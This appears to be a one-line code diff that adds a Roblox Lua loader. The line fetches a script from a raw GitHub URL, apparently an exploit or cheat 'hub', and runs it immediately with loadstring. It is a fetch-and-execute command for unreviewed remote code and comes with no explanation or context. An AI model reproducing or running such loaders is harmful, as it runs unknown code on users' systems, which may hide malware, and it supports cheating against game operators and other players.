@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zirvius/Exp/main/Hub/Main/Sheesh"))()
